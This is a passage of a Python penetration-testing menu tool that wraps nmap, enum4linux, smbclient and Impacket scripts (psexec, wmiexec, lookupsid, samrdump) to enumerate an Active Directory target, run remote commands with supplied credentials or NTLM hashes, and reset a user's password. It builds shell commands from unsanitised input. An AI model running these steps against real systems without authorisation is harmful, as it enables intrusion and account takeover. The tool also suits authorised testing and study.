# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the current USERS HASH value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = NTM
      NTM = input("[*] Please enter HASH value: ")

      if NTM != "":
         if len(NTM) < COL1:
            NTM = padding(NTM, COL1)
      else:
         NTM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = DOM
      DOM = input("[*] Please enter DOMAIN name: ")

      if DOM != "":
         if len(DOM) < COL1:
            DOM = padding(DOM, COL1)
         if DOMC == 1:
            print("[+] Removing previous domain name from /etc/hosts...")
            command("sed -i '$d' /etc/hosts")
         if DOM[:5] != "EMPTY":
            command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
            print("[+] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
            DOMC = 1
         prompt()
      else:
         DOM = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = SID
      SID = input("[*] Please enter DOMAIN SID value: ")

      if SID != "":
         if len(SID) < COL1:
            SID = padding(SID, COL1)
      else:
         SID = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = TSH
      TSH = input("[*] Please enter SHARE name: ")

      if TSH != "":
         if len(TSH) < COL1:
            TSH = padding(TSH,COL1)
      else:
         TSH = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Reset local TIME to match kerberos skew. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = LTM
      LTM = input("[*] Please enter computer TIME: ")

      if LTM != "":
         command("date --set=" + LTM)
         LTM = padding(LTM, COL1)
         SKEW = 1
      else:
         LTM = BAK      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Change local working DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      oldDirectory = DIR.rstrip(" ")     
      newDirectory = input("[*] Please enter new WORK FOLDER: ").upper()

      if os.path.exists(newDirectory):
         print("[-] Directory already exists....")
      else:
         if len(newDirectory) > 0:
            os.mkdir(newDirectory)
            DIR = newDirectory
            if len(DIR) < COL1:
               DIR = padding(DIR, COL1)
            print("[+] Working directory changed...")
            print("[*] Checking to see if the old directory can be safely deleted...")
            if len(os.listdir(oldDirectory)) == 0:
               os.rmdir(oldDirectory)
               print("[+] Old directory succesfully deleted...")
            else:
               print("[-] Old directory still contains data...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Ping localhost IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      if TIP[:5] != "EMPTY":
         print("")
         command("ping -c 5 "  + TIP.rstrip(" "))
      else:
         print("[-] Remote IP address has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - fierce -dns DNS SERVER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      if DNS[:5] != "EMPTY":
         command("fierce -dns " + DNS.rstrip(" "))
      else:
         print("\n[-] DNS server has not been specified...")
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      CheckParams = 0

      if (DOM[:5] == "EMPTY"):
         print("\n[-] Domain name not specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if USR[:2] == "''":
         print("\n[-] Username has not been specified...")
         CheckParams = 1
         
      if PAS[:2] == "''":
         print("\n[-] Password has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + DOM.rstrip(" ") + " --include-tombstoned -r")
         command("sed -i '1d' records.csv")
         command("\ncat records.csv")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - exit(1)
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
      else:
         print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
         command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
         POR = linecache.getline("PORTS.tmp", 1)         
         
         if len(POR) < COL1:
            POR = padding(POR, COL1)
         else:
            POR = POR.rstrip("\n")           

         if POR[:1] == "":
            print("[-] Unable to enumerate any port information, good luck!!...")
         else:
            print("[+] Found live ports...\n")
            print(colored(POR,colour2))
        
         prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Intense quick TCP scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
      else:
         if POR[:5] != "EMPTY":
            print("[*] Scanning specified live ports only, please wait...")
            command("nmap " + IP46 + " -p " + POR.rstrip(" ") + " -sC -sV " + TIP.rstrip(" "))
         else:
            print("[*] Fast scanning all ports, please wait...")
            command("nmap " + IP46 + " -T4 -F " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - nmap IP46 -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("nmap " + IP46 + " --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - nmap IP46 -sU -O -p 123 --script ntp-info IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      if TIP[:5] != "EMPTY":
#         command("nmap " + IP46 + " -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
         command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" "))
      else:
         print("\n[-] Remote IP address has not been specified...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - getArch.py target IP
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      if TIP[:5] != "EMPTY":
         print("[*] Attempting to enumerate architecture...")
         OS = "[-] Not found..."
         command(keypath + "getArch.py -target " + TIP.rstrip(" ") + " > os.txt")
         with open("os.txt") as search:
            for line in search:
               if "is" in line:
                  OS = line
                  print("[+] Found architecture...")
         print(colored("\n" + OS,colour2))
         command("rm os.txt")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='21':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - services.py USER:PASSWOrd@IP list.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='22':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      CheckParams = 0

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " whoami /all")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      CheckParams = 0

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         command(keypath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP service command.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         if USR.rstrip(" ") != "Administrator":
            command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ifmap.py IP 135.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      if TIP[:5] != "EMPTY":
         command(keypath + "ifmap.py " + TIP.rstrip(" ") + " 135")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      ifmap = input("[*] Please enter MSRPC interface (ifmap) : ")    
      ifmap = ifmap.replace("v",'')
      ifmap = ifmap .replace(":",'')
      
      if ifmap != "" and TIP[:5] != "EMPTY":
         command(keypath + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
# Details : Anonymous login check.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      if TIP[:5] != "EMPTY":
         print ("")
         command("enum4linux -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -v " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='31':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Enumerating, please wait....")
         command(keypath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")         
         
         command("cat DOMAIN.tmp | grep 'Domain SID' > SID.tmp")
         SIDID = linecache.getline("SID.tmp", 1)
         if SIDID != "":
            if SID[:5] == "EMPTY":
               SID = SIDID.replace('[*] Domain SID is: ',"")
               print("[+] Domain SID found...\n")
               command("echo " + SID + "\n")
         if SID[:5] == "EMPTY":
            print("[-] Unable to find domain SID...")
         os.remove("SID.tmp")
         
         command("sed -i /*/d DOMAIN.tmp")
         command("sed -i 's/.*://g' DOMAIN.tmp")   
         command("cat DOMAIN.tmp | grep SidTypeAlias | sort > ALIAS.tmp")      
         command("cat DOMAIN.tmp | grep SidTypeGroup | sort > GROUP.tmp")
         command("cat DOMAIN.tmp | grep SidTypeUser  | sort > USERS.tmp")
         
         command("sed -i 's/(SidTypeAlias)//g' ALIAS.tmp")
         command("sed -i 's/(SidTypeGroup)//g' GROUP.tmp")
         command("sed -i 's/(SidTypeUser)//g'  USERS.tmp")
         
         if os.path.getsize("ALIAS.tmp") != 0:
            print("[+] Found Aliases...\n")
            command("tput setaf 2; tput bold")
            command("cat ALIAS.tmp")
            command("tput sgr0; tput dim")
         else:
            print("[-] Unable to find aliases...")
            
         if os.path.getsize("GROUP.tmp") != 0:
            print("\n[+] Found Groups...\n")
            command("tput setaf 2; tput bold")
            command("cat GROUP.tmp")
            command("tput sgr0; tput dim")
         else:
            print("[-] Unable to find groups...")
            
         if os.path.getsize("USERS.tmp") != 0:
            print("\n[+] Found Users...\n")
            command("tput setaf 2; tput bold")
            command("cat USERS.tmp")  
            command("tput sgr0; tput dim")
         else:
            print("[-] Unable to find usernames...")
         
         if os.path.getsize("USERS.tmp") != 0:
            command("rm usernames.txt")		# DELETE OLD
            command("touch usernames.txt")	# CREATE NEW
         
            for x in range(0, maximum):
               username = linecache.getline("USERS.tmp", x + 1)
               if username != "":
                  try:
                     null,USER[x] = username.split(DOM.rstrip(" ") + "\\")
                  except ValueError:
                     USER[x] = "Error..."
                  if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
                  command("echo " + USER[x] + " >> usernames.txt")
               else:
                  USER[x] = " "*COL3      
            command("rm *.tmp")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Enumerating users, please wait this can take sometime...\n")
         os.remove("usernames.txt")					# DELETE CURRENT VERSION
         command("touch usernames.txt")					# CREATE EMPTY NEW ONE
         command(keypath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
         command("sed -i -n '/Found user: /p' USERS.tmp")		# SELECT ONLY FOUND USERS
         command("cat USERS.tmp | sort > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
         os.remove("USERS.tmp")
         command("mv USERS2.tmp USERS.tmp")      

         for x in range (0, maximum):
            USER[x] = linecache.getline('USERS.tmp', x+1)
            if USER[x] != "":
               USER[x] = USER[x].replace("Found user: ", "")
               USER[x] = USER[x].split(",")
               USER[x] = USER[x][0]
               USER[x] = padding(USER[x], COL3)
               if USER[x] != "":
                  print(colored(USER[x],colour2))

                  command("echo " + USER[x] + " >> usernames.txt")	# ASSIGN USERS NAME
               else:
                  USER[x] = " "*COL3					# ASSIGN EMPTY USERS
               PASS[x] = "."*COL4					# RESET PASSWORDS
            else:
               USER[x] = " "*COL3
               PASS[x] = " "*COL4   
   
         os.remove("USERS.tmp")	# CLEAR WORK FILE
         if USER[1][:1] == " ":
            print ("[*] No entries received.")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Details : #HKEY_LOCAL_MACHINE\SAM
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='34':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='35':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '36':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='37':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if PAS != '':
         if CheckParams != 1:
            os.remove("shares.txt")
            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares.txt")
         
            command("tput setaf 2")
            command("cat shares.txt")
            command("tput sgr0")
         
            command("sed -i /'is an IPv6 address'/d shares.txt")	# TIDY UP THE FILE READY FOR READING
            command("sed -i /Sharename/d shares.txt")
            command("sed -i /-/d shares.txt")
            command("sed -i '/^$/d' shares.txt")
      
            count = len(open('shares.txt').readlines( ))                
            if count > 0:
               cleanshares()					# PURGE CURRENT SHARE VALUES STORED IN MEMORY
         
            for x in range(0, count):
               test = linecache.getline("shares.txt",x + 1).rstrip(" ")
               if test != '':
                  SHAR[x] = test.lstrip()
                  SHAR[x] = padding(SHAR[x], COL2)			# REPOPULATE SHARE
            
               if x == 0:
                  if SHAR[0] == "session setup failed: NT_STATUS_PASSWORD_MUS":
                     print(colored("[!] Bonus!! It looks like we can change this paricular users password...", colour4))
                     command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
                     print("[+] Password has been reset for this user...")
      else:
         if NTM != "":
            command(keypath + "smbclient.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))                    
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      CheckParams = 0

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if ":" in TIP.rstrip(" "):
         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
         CheckParams = 1
      
      if CheckParams != 1:
         if DOM[:5] == "EMPTY":
            print("")
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + " -R")
         else:
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + "R")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      if TIP[:5] != "EMPTY":
         print("")
         command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
      else:
         print("[-] Remote IP address has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(keypath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Enumerating, please wait...")
         command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
         
         command("sed -i '/@/!d' users.tmp")						# REMOVE ALL LINES NOT CONTAINING DOMAIN NAME     
         command("sort users.tmp | uniq > susers.tmp")					# SORT UNIQUE

         with open("susers.tmp", "r") as read:
            for line in read:
               line = line.replace("|     ","")
               line = line.replace("|_    ","")
               line, null = line.split("@")
               if line != "":
                  command("echo " + line + " >> rvalid.tmp")
         read.close()
                  
         if os.path.exists("rvalid.tmp"):
            print("[+] Only the following users are valid...\n")         
            command("tput setaf 2")
            command("cat rvalid.tmp")
            command("tput sgr0")            
            
            count = len(open('rvalid.tmp').readlines())					# FIND OUT HOW MANY TO PROCESS
                       
            for x in range(0, count):
               linecache.clearcache()
               validname = linecache.getline("rvalid.tmp", x + 1).rstrip("\n")
               
               for y in range(0, maximum):
                  linecache.clearcache()
                  checkuser = linecache.getline("usernames.txt", y + 1).rstrip("\n")
                  checkhash = linecache.getline("hashes.txt", y + 1).rstrip("\n")
                  
                  if validname == checkuser:                    
                     command("echo " + checkuser + " >> topusers.tmp")
                     
                     if "$" in checkuser:
                        with open("usernames.txt", "r") as read:				# ONLY WAY TO DEAL WITH APT$ 
                            for line in read:
                                line = line.rstrip("\n")
                                if line != checkuser:
                                   line = line.replace("$", "\$")
                                   command("echo " + line + " >> newusers.tmp")
                        read.close()
                  
                        command("rm usernames.txt")
                        command("mv newusers.tmp usernames.txt")
                     else:
                        command("gawk -i inplace '!/" + checkuser + "/' usernames.txt")
                        
                     command("echo " + checkhash + " >> tophash.tmp")
                     command("sed -i '/" + checkhash + "/d' hashes.txt")
            
            command("cat usernames.txt >> topusers.tmp")
            command("rm usernames.txt")
